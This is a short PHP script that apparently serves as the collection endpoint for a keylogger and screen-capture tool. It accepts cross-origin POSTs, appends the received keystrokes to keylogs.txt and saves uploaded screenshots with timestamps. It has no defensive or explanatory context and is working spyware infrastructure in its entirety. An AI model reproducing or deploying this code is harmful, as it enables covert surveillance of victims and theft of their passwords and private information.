<?php
header('Access-Control-Allow-Origin: *');
if($_POST['data'] ?? false) {
    $log = date('Y-m-d H:i:s') . " - KEY: " . $_POST['data'] . "\n";
    file_put_contents('keylogs.txt', $log, FILE_APPEND);
    echo "OK";
} elseif($_FILES['screenshot'] ?? false) {
    $target = 'screenshots/' . date('YmdHis') . '.jpg';
    move_uploaded_file($_FILES['screenshot']['tmp_name'], $target);
    echo "SCREEN OK";
}
?>